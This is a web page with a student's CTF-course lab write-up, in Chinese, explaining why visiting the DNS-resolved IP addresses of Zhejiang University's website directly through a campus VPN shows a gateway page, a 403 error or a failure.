@@ -1,0 +1,558 @@
+<!DOCTYPE html>
+<html lang="en"><head><title>lab1web</title><meta charset="utf-8"/><link rel="preconnect" href="https://fonts.googleapis.com"/><link rel="preconnect" href="https://fonts.gstatic.com"/><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Schibsted Grotesk:wght@400;700&amp;family=Source Sans Pro:ital,wght@0,400;0,600;1,400;1,600&amp;family=IBM Plex Mono:wght@400;600&amp;display=swap"/><link rel="preconnect" href="https://cdnjs.cloudflare.com" crossorigin="anonymous"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/><meta name="og:site_name" content="Quartz 4"/><meta property="og:title" content="lab1web"/><meta property="og:type" content="website"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:title" content="lab1web"/><meta name="twitter:description" content="Lab1Web Yekaisen task1 由于在校外，用atrust进行vpn连接，结果有一些特殊，进行了分析研究。 ![image-20250703103131408](/Users/kaisenye/Library/Application Support/typora-user-images/image-20250703103131408.png) 校内DNS 返回的IP: 198.18.0.3(这是一个特殊用途的IP) 校外公网DNS返回的IP: 122.225.214.239 等 (CDN服务器的IP) 现在我们来分析直接访问这些IP地址的情况。 1."/><meta property="og:description" content="Lab1Web Yekaisen task1 由于在校外，用atrust进行vpn连接，结果有一些特殊，进行了分析研究。 ![image-20250703103131408](/Users/kaisenye/Library/Application Support/typora-user-images/image-20250703103131408.png) 校内DNS 返回的IP: 198.18.0.3(这是一个特殊用途的IP) 校外公网DNS返回的IP: 122.225.214.239 等 (CDN服务器的IP) 现在我们来分析直接访问这些IP地址的情况。 1."/><meta property="og:image:alt" content="Lab1Web Yekaisen task1 由于在校外，用atrust进行vpn连接，结果有一些特殊，进行了分析研究。 ![image-20250703103131408](/Users/kaisenye/Library/Application Support/typora-user-images/image-20250703103131408.png) 校内DNS 返回的IP: 198.18.0.3(这是一个特殊用途的IP) 校外公网DNS返回的IP: 122.225.214.239 等 (CDN服务器的IP) 现在我们来分析直接访问这些IP地址的情况。 1."/><meta property="twitter:domain" content="quartz.jzhao.xyz"/><meta property="og:url" content="https://quartz.jzhao.xyz/ctf短学期留档/lab1web"/><meta property="twitter:url" content="https://quartz.jzhao.xyz/ctf短学期留档/lab1web"/><link rel="icon" href="../static/icon.png"/><meta name="description" content="Lab1Web Yekaisen task1 由于在校外，用atrust进行vpn连接，结果有一些特殊，进行了分析研究。 ![image-20250703103131408](/Users/kaisenye/Library/Application Support/typora-user-images/image-20250703103131408.png) 校内DNS 返回的IP: 198.18.0.3(这是一个特殊用途的IP) 校外公网DNS返回的IP: 122.225.214.239 等 (CDN服务器的IP) 现在我们来分析直接访问这些IP地址的情况。 1."/><meta name="generator" content="Quartz"/><link href="../index.css" rel="stylesheet" type="text/css" spa-preserve/><style>.expand-button {
+  position: absolute;
+  display: flex;
+  float: right;
+  padding: 0.4rem;
+  margin: 0.3rem;
+  right: 0;
+  color: var(--gray);
+  border-color: var(--dark);
+  background-color: var(--light);
+  border: 1px solid;
+  border-radius: 5px;
+  opacity: 0;
+  transition: 0.2s;
+}
+.expand-button > svg {
+  fill: var(--light);
+  filter: contrast(0.3);
+}
+.expand-button:hover {
+  cursor: pointer;
+  border-color: var(--secondary);
+}
+.expand-button:focus {
+  outline: 0;
+}
+
+pre:hover > .expand-button {
+  opacity: 1;
+  transition: 0.2s;
+}
+
+#mermaid-container {
+  position: fixed;
+  contain: layout;
+  z-index: 999;
+  left: 0;
+  top: 0;
+  width: 100vw;
+  height: 100vh;
+  overflow: hidden;
+  display: none;
+  backdrop-filter: blur(4px);
+  background: rgba(0, 0, 0, 0.5);
+}
+#mermaid-container.active {
+  display: inline-block;
+}
+#mermaid-container > #mermaid-space {
+  border: 1px solid var(--lightgray);
+  background-color: var(--light);
+  border-radius: 5px;
+  position: fixed;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  height: 80vh;
+  width: 80vw;
+  overflow: hidden;
+}
+#mermaid-container > #mermaid-space > .mermaid-content {
+  padding: 2rem;
+  position: relative;
+  transform-origin: 0 0;
+  transition: transform 0.1s ease;
+  overflow: visible;
+  min-height: 200px;
+  min-width: 200px;
+}
+#mermaid-container > #mermaid-space > .mermaid-content pre {
+  margin: 0;
+  border: none;
+}
+#mermaid-container > #mermaid-space > .mermaid-content svg {
+  max-width: none;
+  height: auto;
+}
+#mermaid-container > #mermaid-space > .mermaid-controls {
+  position: absolute;
+  bottom: 20px;
+  right: 20px;
+  display: flex;
+  gap: 8px;
+  padding: 8px;
+  background: var(--light);
+  border: 1px solid var(--lightgray);
+  border-radius: 6px;
+  box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+  z-index: 2;
+}
+#mermaid-container > #mermaid-space > .mermaid-controls .mermaid-control-button {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  width: 32px;
+  height: 32px;
+  padding: 0;
+  border: 1px solid var(--lightgray);
+  background: var(--light);
+  color: var(--dark);
+  border-radius: 4px;
+  cursor: pointer;
+  font-size: 16px;
+  font-family: var(--bodyFont);
+  transition: all 0.2s ease;
+}
+#mermaid-container > #mermaid-space > .mermaid-controls .mermaid-control-button:hover {
+  background: var(--lightgray);
+}
+#mermaid-container > #mermaid-space > .mermaid-controls .mermaid-control-button:active {
+  transform: translateY(1px);
+}
+#mermaid-container > #mermaid-space > .mermaid-controls .mermaid-control-button:nth-child(2) {
+  width: auto;
+  padding: 0 12px;
+  font-size: 14px;
+}
+/*# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VSb290IjoiL1VzZXJzL2thaXNlbnllL0Rlc2t0b3Avd2Vic2l0ZS9xdWFydHovcXVhcnR6L2NvbXBvbmVudHMvc3R5bGVzIiwic291cmNlcyI6WyJtZXJtYWlkLmlubGluZS5zY3NzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiJBQUFBO0VBQ0U7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7O0FBRUE7RUFDRTtFQUNBOztBQUdGO0VBQ0U7RUFDQTs7QUFHRjtFQUNFOzs7QUFLRjtFQUNFO0VBQ0E7OztBQUlKO0VBQ0U7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTs7QUFFQTtFQUNFOztBQUdGO0VBQ0U7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7O0FBRUE7RUFDRTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTs7QUFFQTtFQUNFO0VBQ0E7O0FBR0Y7RUFDRTtFQUNBOztBQUlKO0VBQ0U7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTs7QUFFQTtFQUNFO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7O0FBRUE7RUFDRTs7QUFHRjtFQUNFOztBQUlGO0VBQ0U7RUFDQTtFQUNBIiwic291cmNlc0NvbnRlbnQiOlsiLmV4cGFuZC1idXR0b24ge1xuICBwb3NpdGlvbjogYWJzb2x1dGU7XG4gIGRpc3BsYXk6IGZsZXg7XG4gIGZsb2F0OiByaWdodDtcbiAgcGFkZGluZzogMC40cmVtO1xuICBtYXJnaW46IDAuM3JlbTtcbiAgcmlnaHQ6IDA7IC8vIE5PVEU6IHJpZ2h0IHdpbGwgYmUgc2V0IGluIG1lcm1haWQuaW5saW5lLnRzXG4gIGNvbG9yOiB2YXIoLS1ncmF5KTtcbiAgYm9yZGVyLWNvbG9yOiB2YXIoLS1kYXJrKTtcbiAgYmFja2dyb3VuZC1jb2xvcjogdmFyKC0tbGlnaHQpO1xuICBib3JkZXI6IDFweCBzb2xpZDtcbiAgYm9yZGVyLXJhZGl1czogNXB4O1xuICBvcGFjaXR5OiAwO1xuICB0cmFuc2l0aW9uOiAwLjJzO1xuXG4gICYgPiBzdmcge1xuICAgIGZpbGw6IHZhcigtLWxpZ2h0KTtcbiAgICBmaWx0ZXI6IGNvbnRyYXN0KDAuMyk7XG4gIH1cblxuICAmOmhvdmVyIHtcbiAgICBjdXJzb3I6IHBvaW50ZXI7XG4gICAgYm9yZGVyLWNvbG9yOiB2YXIoLS1zZWNvbmRhcnkpO1xuICB9XG5cbiAgJjpmb2N1cyB7XG4gICAgb3V0bGluZTogMDtcbiAgfVxufVxuXG5wcmUge1xuICAmOmhvdmVyID4gLmV4cGFuZC1idXR0b24ge1xuICAgIG9wYWNpdHk6IDE7XG4gICAgdHJhbnNpdGlvbjogMC4ycztcbiAgfVxufVxuXG4jbWVybWFpZC1jb250YWluZXIge1xuICBwb3NpdGlvbjogZml4ZWQ7XG4gIGNvbnRhaW46IGxheW91dDtcbiAgei1pbmRleDogOTk5O1xuICBsZWZ0OiAwO1xuICB0b3A6IDA7XG4gIHdpZHRoOiAxMDB2dztcbiAgaGVpZ2h0OiAxMDB2aDtcbiAgb3ZlcmZsb3c6IGhpZGRlbjtcbiAgZGlzcGxheTogbm9uZTtcbiAgYmFja2Ryb3AtZmlsdGVyOiBibHVyKDRweCk7XG4gIGJhY2tncm91bmQ6IHJnYmEoMCwgMCwgMCwgMC41KTtcblxuICAmLmFjdGl2ZSB7XG4gICAgZGlzcGxheTogaW5saW5lLWJsb2NrO1xuICB9XG5cbiAgJiA+ICNtZXJtYWlkLXNwYWNlIHtcbiAgICBib3JkZXI6IDFweCBzb2xpZCB2YXIoLS1saWdodGdyYXkpO1xuICAgIGJhY2tncm91bmQtY29sb3I6IHZhcigtLWxpZ2h0KTtcbiAgICBib3JkZXItcmFkaXVzOiA1cHg7XG4gICAgcG9zaXRpb246IGZpeGVkO1xuICAgIHRvcDogNTAlO1xuICAgIGxlZnQ6IDUwJTtcbiAgICB0cmFuc2Zvcm06IHRyYW5zbGF0ZSgtNTAlLCAtNTAlKTtcbiAgICBoZWlnaHQ6IDgwdmg7XG4gICAgd2lkdGg6IDgwdnc7XG4gICAgb3ZlcmZsb3c6IGhpZGRlbjtcblxuICAgICYgPiAubWVybWFpZC1jb250ZW50IHtcbiAgICAgIHBhZGRpbmc6IDJyZW07XG4gICAgICBwb3NpdGlvbjogcmVsYXRpdmU7XG4gICAgICB0cmFuc2Zvcm0tb3JpZ2luOiAwIDA7XG4gICAgICB0cmFuc2l0aW9uOiB0cmFuc2Zvcm0gMC4xcyBlYXNlO1xuICAgICAgb3ZlcmZsb3c6IHZpc2libGU7XG4gICAgICBtaW4taGVpZ2h0OiAyMDBweDtcbiAgICAgIG1pbi13aWR0aDogMjAwcHg7XG5cbiAgICAgIHByZSB7XG4gICAgICAgIG1hcmdpbjogMDtcbiAgICAgICAgYm9yZGVyOiBub25lO1xuICAgICAgfVxuXG4gICAgICBzdmcge1xuICAgICAgICBtYXgtd2lkdGg6IG5vbmU7XG4gICAgICAgIGhlaWdodDogYXV0bztcbiAgICAgIH1cbiAgICB9XG5cbiAgICAmID4gLm1lcm1haWQtY29udHJvbHMge1xuICAgICAgcG9zaXRpb246IGFic29sdXRlO1xuICAgICAgYm90dG9tOiAyMHB4O1xuICAgICAgcmlnaHQ6IDIwcHg7XG4gICAgICBkaXNwbGF5OiBmbGV4O1xuICAgICAgZ2FwOiA4cHg7XG4gICAgICBwYWRkaW5nOiA4cHg7XG4gICAgICBiYWNrZ3JvdW5kOiB2YXIoLS1saWdodCk7XG4gICAgICBib3JkZXI6IDFweCBzb2xpZCB2YXIoLS1saWdodGdyYXkpO1xuICAgICAgYm9yZGVyLXJhZGl1czogNnB4O1xuICAgICAgYm94LXNoYWRvdzogMCAycHggNHB4IHJnYmEoMCwgMCwgMCwgMC4xKTtcbiAgICAgIHotaW5kZXg6IDI7XG5cbiAgICAgIC5tZXJtYWlkLWNvbnRyb2wtYnV0dG9uIHtcbiAgICAgICAgZGlzcGxheTogZmxleDtcbiAgICAgICAgYWxpZ24taXRlbXM6IGNlbnRlcjtcbiAgICAgICAganVzdGlmeS1jb250ZW50OiBjZW50ZXI7XG4gICAgICAgIHdpZHRoOiAzMnB4O1xuICAgICAgICBoZWlnaHQ6IDMycHg7XG4gICAgICAgIHBhZGRpbmc6IDA7XG4gICAgICAgIGJvcmRlcjogMXB4IHNvbGlkIHZhcigtLWxpZ2h0Z3JheSk7XG4gICAgICAgIGJhY2tncm91bmQ6IHZhcigtLWxpZ2h0KTtcbiAgICAgICAgY29sb3I6IHZhcigtLWRhcmspO1xuICAgICAgICBib3JkZXItcmFkaXVzOiA0cHg7XG4gICAgICAgIGN1cnNvcjogcG9pbnRlcjtcbiAgICAgICAgZm9udC1zaXplOiAxNnB4O1xuICAgICAgICBmb250LWZhbWlseTogdmFyKC0tYm9keUZvbnQpO1xuICAgICAgICB0cmFuc2l0aW9uOiBhbGwgMC4ycyBlYXNlO1xuXG4gICAgICAgICY6aG92ZXIge1xuICAgICAgICAgIGJhY2tncm91bmQ6IHZhcigtLWxpZ2h0Z3JheSk7XG4gICAgICAgIH1cblxuICAgICAgICAmOmFjdGl2ZSB7XG4gICAgICAgICAgdHJhbnNmb3JtOiB0cmFuc2xhdGVZKDFweCk7XG4gICAgICAgIH1cblxuICAgICAgICAvLyBTdHlsZSB0aGUgcmVzZXQgYnV0dG9uIGRpZmZlcmVudGx5XG4gICAgICAgICY6bnRoLWNoaWxkKDIpIHtcbiAgICAgICAgICB3aWR0aDogYXV0bztcbiAgICAgICAgICBwYWRkaW5nOiAwIDEycHg7XG4gICAgICAgICAgZm9udC1zaXplOiAxNHB4O1xuICAgICAgICB9XG4gICAgICB9XG4gICAgfVxuICB9XG59XG4iXX0= */</style><link href="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/katex.min.css" rel="stylesheet" type="text/css" spa-preserve/><script src="../prescript.js" type="application/javascript" spa-preserve></script><script type="application/javascript" spa-preserve>const fetchData = fetch("../static/contentIndex.json").then(data => data.json())</script><link rel="alternate" type="application/rss+xml" title="RSS Feed" href="https://quartz.jzhao.xyz/index.xml"/><meta property="og:image:width" content="1200"/><meta property="og:image:height" content="630"/><meta property="og:image" content="https://quartz.jzhao.xyz/ctf短学期留档/lab1web-og-image.webp"/><meta property="og:image:url" content="https://quartz.jzhao.xyz/ctf短学期留档/lab1web-og-image.webp"/><meta name="twitter:image" content="https://quartz.jzhao.xyz/ctf短学期留档/lab1web-og-image.webp"/><meta property="og:image:type" content="image/.webp"/></head><body data-slug="ctf短学期留档/lab1web"><div id="quartz-root" class="page"><div id="quartz-body"><div class="left sidebar"><h2 class="page-title"><a href="..">Quartz 4</a></h2><div class="spacer mobile-only"></div><div class="flex-component" style="flex-direction: row; flex-wrap: nowrap; gap: 1rem;"><div style="flex-grow: 1; flex-shrink: 1; flex-basis: auto; order: 0; align-self: center; justify-self: center;"><div class="search"><button class="search-button"><p>Search</p><svg role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 19.9 19.7"><title>Search</title><g class="search-path" fill="none"><path stroke-linecap="square" d="M18.5 18.3l-5.4-5.4"></path><circle cx="8" cy="8" r="7"></circle></g></svg></button><div class="search-container"><div class="search-space"><input autocomplete="off" class="search-bar" name="search" type="text" aria-label="Search for something" placeholder="Search for something"/><div class="search-layout" data-preview="true"></div></div></div></div></div><div style="flex-grow: 0; flex-shrink: 1; flex-basis: auto; order: 0; align-self: center; justify-self: center;"><button class="darkmode"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" class="dayIcon" x="0px" y="0px" viewBox="0 0 35 35" style="enable-background:new 0 0 35 35" xml:space="preserve" aria-label="Dark mode"><title>Dark mode</title><path d="M6,17.5C6,16.672,5.328,16,4.5,16h-3C0.672,16,0,16.672,0,17.5    S0.672,19,1.5,19h3C5.328,19,6,18.328,6,17.5z M7.5,26c-0.414,0-0.789,0.168-1.061,0.439l-2,2C4.168,28.711,4,29.086,4,29.5    C4,30.328,4.671,31,5.5,31c0.414,0,0.789-0.168,1.06-0.44l2-2C8.832,28.289,9,27.914,9,27.5C9,26.672,8.329,26,7.5,26z M17.5,6    C18.329,6,19,5.328,19,4.5v-3C19,0.672,18.329,0,17.5,0S16,0.672,16,1.5v3C16,5.328,16.671,6,17.5,6z M27.5,9    c0.414,0,0.789-0.168,1.06-0.439l2-2C30.832,6.289,31,5.914,31,5.5C31,4.672,30.329,4,29.5,4c-0.414,0-0.789,0.168-1.061,0.44    l-2,2C26.168,6.711,26,7.086,26,7.5C26,8.328,26.671,9,27.5,9z M6.439,8.561C6.711,8.832,7.086,9,7.5,9C8.328,9,9,8.328,9,7.5    c0-0.414-0.168-0.789-0.439-1.061l-2-2C6.289,4.168,5.914,4,5.5,4C4.672,4,4,4.672,4,5.5c0,0.414,0.168,0.789,0.439,1.06    L6.439,8.561z M33.5,16h-3c-0.828,0-1.5,0.672-1.5,1.5s0.672,1.5,1.5,1.5h3c0.828,0,1.5-0.672,1.5-1.5S34.328,16,33.5,16z     M28.561,26.439C28.289,26.168,27.914,26,27.5,26c-0.828,0-1.5,0.672-1.5,1.5c0,0.414,0.168,0.789,0.439,1.06l2,2    C28.711,30.832,29.086,31,29.5,31c0.828,0,1.5-0.672,1.5-1.5c0-0.414-0.168-0.789-0.439-1.061L28.561,26.439z M17.5,29    c-0.829,0-1.5,0.672-1.5,1.5v3c0,0.828,0.671,1.5,1.5,1.5s1.5-0.672,1.5-1.5v-3C19,29.672,18.329,29,17.5,29z M17.5,7    C11.71,7,7,11.71,7,17.5S11.71,28,17.5,28S28,23.29,28,17.5S23.29,7,17.5,7z M17.5,25c-4.136,0-7.5-3.364-7.5-7.5    c0-4.136,3.364-7.5,7.5-7.5c4.136,0,7.5,3.364,7.5,7.5C25,21.636,21.636,25,17.5,25z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" class="nightIcon" x="0px" y="0px" viewBox="0 0 100 100" style="enable-background:new 0 0 100 100" xml:space="preserve" aria-label="Light mode"><title>Light mode</title><path d="M96.76,66.458c-0.853-0.852-2.15-1.064-3.23-0.534c-6.063,2.991-12.858,4.571-19.655,4.571  C62.022,70.495,50.88,65.88,42.5,57.5C29.043,44.043,25.658,23.536,34.076,6.47c0.532-1.08,0.318-2.379-0.534-3.23  c-0.851-0.852-2.15-1.064-3.23-0.534c-4.918,2.427-9.375,5.619-13.246,9.491c-9.447,9.447-14.65,22.008-14.65,35.369  c0,13.36,5.203,25.921,14.65,35.368s22.008,14.65,35.368,14.65c13.361,0,25.921-5.203,35.369-14.65  c3.872-3.871,7.064-8.328,9.491-13.246C97.826,68.608,97.611,67.309,96.76,66.458z"></path></svg></button></div><div style="flex-grow: 0; flex-shrink: 1; flex-basis: auto; order: 0; align-self: center; justify-self: center;"><button class="readermode"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" class="readerIcon" fill="currentColor" stroke="currentColor" stroke-width="0.2" stroke-linecap="round" stroke-linejoin="round" width="64px" height="64px" viewBox="0 0 24 24" aria-label="Reader mode"><title>Reader mode</title><g transform="translate(-1.8, -1.8) scale(1.15, 1.2)"><path d="M8.9891247,2.5 C10.1384702,2.5 11.2209868,2.96705384 12.0049645,3.76669482 C12.7883914,2.96705384 13.8709081,2.5 15.0202536,2.5 L18.7549359,2.5 C19.1691495,2.5 19.5049359,2.83578644 19.5049359,3.25 L19.5046891,4.004 L21.2546891,4.00457396 C21.6343849,4.00457396 21.9481801,4.28672784 21.9978425,4.6528034 L22.0046891,4.75457396 L22.0046891,20.25 C22.0046891,20.6296958 21.7225353,20.943491 21.3564597,20.9931534 L21.2546891,21 L2.75468914,21 C2.37499337,21 2.06119817,20.7178461 2.01153575,20.3517706 L2.00468914,20.25 L2.00468914,4.75457396 C2.00468914,4.37487819 2.28684302,4.061083 2.65291858,4.01142057 L2.75468914,4.00457396 L4.50368914,4.004 L4.50444233,3.25 C4.50444233,2.87030423 4.78659621,2.55650904 5.15267177,2.50684662 L5.25444233,2.5 L8.9891247,2.5 Z M4.50368914,5.504 L3.50468914,5.504 L3.50468914,19.5 L10.9478955,19.4998273 C10.4513189,18.9207296 9.73864328,18.5588115 8.96709342,18.5065584 L8.77307039,18.5 L5.25444233,18.5 C4.87474657,18.5 4.56095137,18.2178461 4.51128895,17.8517706 L4.50444233,17.75 L4.50368914,5.504 Z M19.5049359,17.75 C19.5049359,18.1642136 19.1691495,18.5 18.7549359,18.5 L15.2363079,18.5 C14.3910149,18.5 13.5994408,18.8724714 13.0614828,19.4998273 L20.5046891,19.5 L20.5046891,5.504 L19.5046891,5.504 L19.5049359,17.75 Z M18.0059359,3.999 L15.0202536,4 L14.8259077,4.00692283 C13.9889509,4.06666544 13.2254227,4.50975805 12.7549359,5.212 L12.7549359,17.777 L12.7782651,17.7601316 C13.4923805,17.2719483 14.3447024,17 15.2363079,17 L18.0059359,16.999 L18.0056891,4.798 L18.0033792,4.75457396 L18.0056891,4.71 L18.0059359,3.999 Z M8.9891247,4 L6.00368914,3.999 L6.00599909,4.75457396 L6.00599909,4.75457396 L6.00368914,4.783 L6.00368914,16.999 L8.77307039,17 C9.57551536,17 10.3461406,17.2202781 11.0128313,17.6202194 L11.2536891,17.776 L11.2536891,5.211 C10.8200889,4.56369974 10.1361548,4.13636104 9.37521067,4.02745763 L9.18347055,4.00692283 L8.9891247,4 Z"></path></g></svg></button></div></div><div class="explorer" data-behavior="link" data-collapsed="collapsed" data-savestate="true" data-data-fns="{&quot;order&quot;:[&quot;filter&quot;,&quot;map&quot;,&quot;sort&quot;],&quot;sortFn&quot;:&quot;(a,b)=>!a.isFolder&amp;&amp;!b.isFolder||a.isFolder&amp;&amp;b.isFolder?a.displayName.localeCompare(b.displayName,void 0,{numeric:!0,sensitivity:\&quot;base\&quot;}):!a.isFolder&amp;&amp;b.isFolder?1:-1&quot;,&quot;filterFn&quot;:&quot;node=>node.slugSegment!==\&quot;tags\&quot;&quot;,&quot;mapFn&quot;:&quot;node=>node&quot;}"><button type="button" class="explorer-toggle mobile-explorer hide-until-loaded" data-mobile="true" aria-controls="explorer-content"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide-menu"><line x1="4" x2="20" y1="12" y2="12"></line><line x1="4" x2="20" y1="6" y2="6"></line><line x1="4" x2="20" y1="18" y2="18"></line></svg></button><button type="button" class="title-button explorer-toggle desktop-explorer" data-mobile="false" aria-expanded="true"><h2>Explorer</h2><svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="5 8 14 8" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="fold"><polyline points="6 9 12 15 18 9"></polyline></svg></button><div class="explorer-content" aria-expanded="false"><ul class="explorer-ul overflow" id="list-0"><li class="overflow-end"></li></ul></div><template id="template-file"><li><a href="#"></a></li></template><template id="template-folder"><li><div class="folder-container"><svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="5 8 14 8" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="folder-icon"><polyline points="6 9 12 15 18 9"></polyline></svg><div><button class="folder-button"><span class="folder-title"></span></button></div></div><div class="folder-outer"><ul class="content"></ul></div></li></template></div></div><div class="center"><div class="page-header"><div class="popover-hint"><nav class="breadcrumb-container" aria-label="breadcrumbs"><div class="breadcrumb-element"><a href="../">Home</a><p> ❯ </p></div><div class="breadcrumb-element"><a href="../ctf短学期留档/">ctf短学期留档</a><p> ❯ </p></div><div class="breadcrumb-element"><a href>lab1web</a></div></nav><h1 class="article-title">lab1web</h1><p show-comma="true" class="content-meta"><time datetime="2025-07-18T14:46:26.000Z">Jul 18, 2025</time><span>30 min read</span></p></div></div><article class="popover-hint"><h1 id="lab1web-yekaisen">Lab1Web Yekaisen<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#lab1web-yekaisen" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h1>
+<h2 id="task1">task1<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#task1" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+<p>由于在校外，用atrust进行vpn连接，结果有一些特殊，进行了分析研究。</p>
+<p>![image-20250703103131408](/Users/kaisenye/Library/Application Support/typora-user-images/image-20250703103131408.png)</p>
+<ul>
+<li><strong>校内DNS 返回的IP</strong>: 198.18.0.3(这是一个特殊用途的IP)</li>
+<li><strong>校外公网DNS返回的IP</strong>: <code>122.225.214.239</code> 等 (CDN服务器的IP)</li>
+</ul>
+<p>现在我们来分析直接访问这些IP地址的情况。</p>
+<hr/>
+<h4 id="1-访问校内dns查询到的ip-1981803">1. 访问校内DNS查询到的IP (<code>198.18.0.3</code>)<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#1-访问校内dns查询到的ip-1981803" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h4>
+<ul>
+<li>
+<p><strong>能否访问成功？</strong> 连了vpn后可以，是浙大信息技术中心的网站。</p>
+</li>
+<li>
+<p>![image-20250704132743333](/Users/kaisenye/Library/Application Support/typora-user-images/image-20250704132743333.png)</p>
+</li>
+<li>
+<p><strong>原因？</strong> 推测，ZJU的VPN网关设备非常智能，它同时扮演了两个角色：</p>
+<ol>
+<li><strong>信号员</strong>：它利用内网DNS将某些域名解析到<code>198.18.x.x</code>这个特殊网段，告诉你的VPN客户端：“这个流量要由我（VPN网关）来处理！”</li>
+<li><strong>服务员</strong>：当VPN客户端真的把发往 <code>198.18.0.3</code> 的流量交给它时，这个网关设备本身也配置了一个<strong>默认的网页服务</strong>。</li>
+</ol>
+<p><strong>为什么是信息技术中心的网站？</strong> 这完全是管理员的配置决定的。VPN设备本身就是由信息技术中心管理的，把它自己的官网作为这个特殊IP的默认页面，是非常合情合理的。这相当于一个“帮助页面”或“管理入口”，方便使用VPN的用户了解网络服务信息。 <strong>所以，访问<code>198.18.0.3</code>时，连接到的其实是VPN网关设备本身，而不是<code>www.zju.edu.cn</code>的源服务器。</strong></p>
+<p>让校内的同学帮忙完成访问，得到10.203.4.70</p>
+<p>但是访问10.203.4.70是403 forbidden。</p>
+<p><strong>10.203.4.70是承载<code>www.zju.edu.cn</code>网站的服务器（或其前端负载均衡器）在校园内网中的真实IP地址。</strong> 校内同学通过校内DNS解析出的地址，是直接的内部指向。</p>
+<p><strong>为什么校内直接访问也是<code>403 Forbidden</code>？</strong></p>
+<ol>
+<li>这台位于 <code>10.203.4.70</code> 的服务器上，托管了不止一个网站（例如 <code>www.zju.edu.cn</code>, <code>a.zju.edu.cn</code>, <code>b.zju.edu.cn</code> 等）。</li>
+<li>当同学用IP地址访问时，浏览器发送的HTTP请求头是 <code>Host: 10.203.4.70</code>。</li>
+<li>![image-20250704135327918](/Users/kaisenye/Library/Application Support/typora-user-images/image-20250704135327918.png)</li>
+<li>服务器收到请求后，无法根据这个IP地址来判断同学到底想访问哪个网站。</li>
+<li>为了安全起见，服务器管理员将这台服务器的<strong>默认行为</strong>设置为了“拒绝访问”。返回 <code>403 Forbidden</code> 是一个比显示默认欢迎页更安全的配置，可以防止他人通过扫描IP来窥探服务器上托管了哪些网站。</li>
+</ol>
+</li>
+</ul>
+<p>![image-20250704133001187](/Users/kaisenye/Library/Application Support/typora-user-images/image-20250704133001187.png)</p>
+<h4 id="2-访问校外dns查询到的ip-122225214239">2. 访问校外DNS查询到的IP (<code>122.225.214.239</code>)<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#2-访问校外dns查询到的ip-122225214239" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h4>
+<ul>
+<li><strong>能否访问成功？</strong> <strong>访问失败</strong>，无法看到预期的浙江大学主页。</li>
+</ul>
+<p><strong>结论：</strong> 无论使用哪个IP，直接访问都无法正常打开<code>www.zju.edu.cn</code>的官网。</p>
+<hr/>
